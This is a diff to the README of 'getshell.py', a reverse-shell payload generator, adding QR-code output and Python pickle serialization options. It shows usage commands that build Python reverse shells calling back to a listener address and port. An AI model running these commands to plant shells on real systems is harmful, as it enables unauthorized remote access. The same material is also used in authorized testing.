@@ -43,7 +43,10 @@ The reverse shell (reverse shell) - also called reverse tunnel (reverse tunnel) 
 *    -I, --info : Print all supported reverse shell types
 *    -F, --onefile : Generate Python script reverse shell
 *    -U, --urlencode : Encode payload in URL format
+*    -Q, --QR Generate a QR code from the generated payload
+*    -p, --pickle : Serialize the generated payload using Python Pickle
 ````
+            
 ./getshell.py --info
 ````
 * to generate python reverseshell liunx 
@@ -85,6 +88,27 @@ The reverse shell (reverse shell) - also called reverse tunnel (reverse tunnel) 
 ```
 ./getshell.py -T python -L 10.195.100.22 -P 7777 -F 
 ./getshell.py -T python -L 10.195.100.22 -P 7777 -F -W 
+```
+QR Code
+
+The --QR option generates a QR code containing the generated payload.
+```
+./getshell.py -T python -L 10.195.100.22 -P 4444 --QR
+```
+The QR code is automatically saved in:
+
+Store_shell/
+
+Example:
+
+* Store_shell/python_QR.png
+* QR Code with Base64
+```
+./getshell.py -T python -L 10.195.100.22 -P 4444 -B --QR
+```
+* QR Code with Pickle
+```
+./getshell.py -T python -L 10.195.100.22 -P 4444 --pickle --QR
 ```
 ### note :
 * all output file will autosave at /Stote_shell/ folder 
